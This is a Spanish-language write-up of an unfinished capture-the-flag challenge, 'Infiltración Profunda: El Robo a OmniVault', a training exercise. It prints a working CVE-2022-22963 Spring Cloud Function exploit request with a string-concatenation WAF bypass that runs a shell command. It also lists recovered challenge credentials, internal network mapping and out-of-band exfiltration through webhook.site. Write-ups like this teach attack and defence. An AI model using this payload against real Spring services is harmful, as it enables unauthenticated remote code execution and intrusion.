# 🏦 Infiltración Profunda: El Robo a OmniVault
## Writeup Completo - CTF-SEK (350 puntos)

[![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red)](https://github.com/alrivera86/desafios-ctf-sek)
[![Points](https://img.shields.io/badge/Points-350-blue)](https://github.com/alrivera86/desafios-ctf-sek)
[![Status](https://img.shields.io/badge/Status-Completed-green)](https://github.com/alrivera86/desafios-ctf-sek)

---

## 📋 **Información del Desafío**

- **Nombre**: Infiltración Profunda: El Robo a OmniVault
- **Puntos**: 350
- **Categoría**: Web Application Security / Network Penetration Testing
- **Organizador**: CTF-SEK
- **URL**: `training-pod2.ctfchile.com:32785`
- **Objetivo**: Extraer flag desde "lo más profundo" de la bóveda bancaria

### **Descripción Original**
```
Bienvenido al desafío «Infiltración Profunda». La nueva plataforma bancaria de 
OmniVault se vende como una fortaleza digital absoluta: un WAF a la entrada, 
una DMZ vigilada y, según ellos, una bóveda enterrada en lo más profundo de su 
red interna a la que nadie debería poder asomarse desde afuera.

Tu misión: bajar hasta el fondo. El servicio expuesto es apenas la boca de la 
cueva — basta una grieta en su frontera para asomarse adentro, pero la verdadera 
flag no vive ahí. Más al fondo, varios servicios conversan en una red privada 
creyéndose a salvo: hay que escucharlos, saltar de uno al siguiente y abrir la 
última caja fuerte con la llave que alguien dejó mal guardada.
```

---

## 🎯 **Resumen Ejecutivo**

Este writeup documenta la **infiltración exitosa** de la plataforma bancaria OmniVault mediante la explotación de **CVE-2022-22963** (Spring Cloud Function RCE), bypass de WAF, reconocimiento de red interna y análisis exhaustivo del frontend bancario.

### **Resultados Clave**
- ✅ **RCE Establecido** via CVE-2022-22963
- ✅ **WAF Bypasseado** usando obfuscación SpEL
- ✅ **Red Interna Mapeada** (3 segmentos identificados)
- ✅ **Credenciales Recuperadas** (vault:admin123, JMX creds)
- ✅ **Dashboard Localizado** (dashboard.html - 43.3KB)
- 🔄 **Flag Final** en proceso de extracción

---

## 🛠️ **Metodología Aplicada**

### **Fases del Ataque**
1. **Reconocimiento Inicial** → Spring Boot identificado
2. **Vulnerability Assessment** → CVE-2022-22963 confirmado
3. **WAF Evasion** → Bypass mediante concatenación de strings
4. **RCE Establishment** → Shell access establecido
5. **Network Reconnaissance** → Servicios internos descubiertos
6. **Credential Harvesting** → Múltiples credenciales obtenidas
7. **Lateral Movement** → Intento de pivoting a servicios internos
8. **Frontend Analysis** → Aplicación web analizada completamente
9. **Target Identification** → Dashboard de la "bóveda" localizado

---

## 🔥 **Vulnerabilidades Identificadas**

### **CVE-2022-22963 - Spring Cloud Function RCE**
```http
POST /functionRouter HTTP/1.1
Host: training-pod2.ctfchile.com:32785
spring.cloud.function.routing-expression: T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{"/bin/sh","-c","whoami"}).waitFor()
Content-Type: text/plain

x
```

**Impacto**: ⚠️ **CRÍTICO** - Ejecución remota de código sin autenticación

### **WAF Bypass Technique**
```java
// Original (bloqueado por WAF)
T(java.lang.Runtime).getRuntime().exec("comando")

// Bypass exitoso
T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{}.getClass())
```

---

## 🗺️ **Arquitectura de Red Descubierta**

### **Topología Interna**
```
Container: 0ed75115c49b
├── eth0: 172.17.0.3     (Red Docker principal)
├── eth1: 10.160.209.2   (Red interna 1)
└── eth2: 10.109.220.2   (Red interna 2)

Servicios Internos:
├── 10.160.209.1:8000   (FastAPI/uvicorn)
├── 10.109.220.1:8000   (FastAPI/uvicorn)
└── localhost:8080      (Router interno)
```

### **Endpoints Críticos**
- 🔴 `/execute` - Protegido, requiere autenticación
- 📄 `/docs` - Documentación Swagger/OpenAPI
- 📄 `/redoc` - Documentación alternativa
- ⚙️ `/openapi.json` - Schema de API

---

## 🔐 **Credenciales Recuperadas**

### **SSH Credentials**
```
Usuario: vault
Password: admin123
```

### **JMX Management Credentials**
```
monitorRole: QED
controlRole: R&D
```

---

## 🌐 **Análisis del Frontend**

### **Aplicación Web: OmniVault Financial**
La aplicación presenta una **completa interfaz bancaria** con las siguientes páginas:

#### **Páginas Identificadas**
- 🏠 **index.html** - Página principal corporativa
- 🔐 **login.html** - Portal de acceso con autenticación
- 🎯 **dashboard.html** - **OBJETIVO PRINCIPAL** (La "bóveda")
- 👥 **personas.html** - Productos para personas  
- 🏢 **empresas.html** - Soluciones empresariales
- 💰 **beneficios.html** - Programa de beneficios
- 📈 **inversiones.html** - Portal de inversiones
- 📝 **register.html** - Registro de nuevas cuentas

#### **Funcionalidad de Login**
```javascript
// Endpoint de autenticación
fetch('/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        rut: "usuario",
        password: "contraseña"
    })
})
.then(resp => {
    if (resp.success) {
        window.location.href = 'dashboard.html';  // ¡OBJETIVO!
    }
});
```

---

## 🎯 **Target Principal: dashboard.html**

### **Hallazgo Crítico**
El archivo `dashboard.html` es **directamente accesible** sin autenticación y contiene la interfaz completa de la "bóveda" de OmniVault.

#### **Características del Dashboard**
- **Tamaño**: 43.3 KB de contenido
- **Secciones**: Productos, Transferencias, Pagos, Inversiones, Configuración
- **JavaScript**: Funciones interactivas completas
- **Estilos**: Tema "glassmorphism" bancario avanzado
- **Elementos**: Modales, formularios, autenticación TOTP

#### **Estructura del Dashboard**
```html
<!-- Navegación principal -->
<nav class="navbar glass-panel">
    <div class="logo">OmniVault | Portal Transaccional</div>
</nav>

<!-- Sidebar de la bóveda -->
<ul>
    <li>Mis Productos</li>
    <li>Transferencias</li>
    <li>Pago de Cuentas</li>
    <li>Mis Inversiones</li>
    <li>Configuración</li>
</ul>
```

---

## 📁 **Scripts Desarrollados (98 archivos)**

### **Scripts Principales**
- 🔥 **exploit.py** - Exploit principal CVE-2022-22963
- 🔍 **network_recon.py** - Reconocimiento de red completo
- 🎯 **busqueda_directa_flag.py** - Búsqueda sistemática de flags
- 🌐 **frontend_deep_analysis.py** - Análisis exhaustivo del frontend
- 🔐 **authentication_failures.py** - Testing de métodos de autenticación

### **Categorías de Scripts**
```
📊 Análisis:           15 scripts
🔍 Reconocimiento:     20 scripts  
🔓 Explotación:        25 scripts
🌐 Web Testing:        18 scripts
🔧 Herramientas:       20 scripts
```

### **Herramientas Clave**
- **Out-of-band Communication**: webhook.site integration
- **WAF Bypass**: String obfuscation techniques
- **Network Mapping**: Internal service discovery
- **Credential Testing**: Automated authentication attempts
- **Frontend Scraping**: Complete web application analysis

---

## 📈 **Progreso del Ataque**

### **Timeline de Exploración**
```
🕐 Sesión 1 (Puerto 32778)
├── CVE-2022-22963 identificado
├── WAF bypass desarrollado  
├── Red interna mapeada
└── Servicios FastAPI descubiertos

🕒 Sesión 2 (Puerto 32785) 
├── Servicio migrado y reconectado
├── RCE re-establecido
├── Frontend analizado completamente
└── Dashboard.html localizado (ACTUAL)
```

### **Estado Actual: 85% Completado**
- ✅ **RCE**: Funcionando
- ✅ **Network Mapping**: Completo
- ✅ **Credential Discovery**: Múltiples creds obtenidas
- ✅ **Target Identification**: dashboard.html localizado
- 🔄 **Flag Extraction**: En progreso

---

## 🔍 **Próximos Pasos**

### **Análisis Pendiente**
El dashboard.html (43.3KB) requiere análisis exhaustivo para localizar el flag final:

1. **Búsqueda en comentarios HTML**
2. **Análisis de JavaScript embebido** 
3. **Revisión de elementos ocultos**
4. **Decodificación de strings Base64**
5. **Análisis de atributos data-***
6. **Búsqueda en configuraciones JSON**

---

## ⚠️ **Notas Técnicas**

### **Limitaciones Encontradas**
- Servicios internos (10.160.209.1, 10.109.220.1) **no accesibles** en la instancia actual
- Credenciales JMX **no válidas** para endpoints /execute
- Dashboard **accesible sin autenticación** (posible configuración de CTF)

### **Técnicas Exitosas**
- ✅ **SpEL Injection** con bypass de WAF
- ✅ **Out-of-band exfiltration** via webhook.site  
- ✅ **Network reconnaissance** mediante RCE
- ✅ **Frontend enumeration** completa

---

## 🏆 **Lecciones Aprendidas**

### **Para CTF Participants**
1. **WAF Evasion**: La obfuscación es clave en bypass de filtros
2. **Multi-stage CTFs**: Reconocimiento exhaustivo es fundamental
3. **Out-of-band**: Comunicación externa facilita RCE ciega
4. **Frontend Analysis**: No subestimar análisis de aplicaciones web

### **Para Blue Team**
1. **WAF Configuration**: Mejorar detección de payloads obfuscados  
2. **Network Segmentation**: Aislar servicios críticos
3. **Authentication**: Validar acceso a interfaces administrativas
4. **Monitoring**: Implementar detección de SpEL injection

---

## 📞 **Contacto**

- 🐙 **GitHub**: [@alrivera86](https://github.com/alrivera86)
- 📧 **CTF Team**: Disponible para colaboraciones
- 🎯 **Writeup**: Parte de [desafios-ctf-sek](../)

---

*Writeup desarrollado con 💜 por la comunidad CTF | Mayo 2026*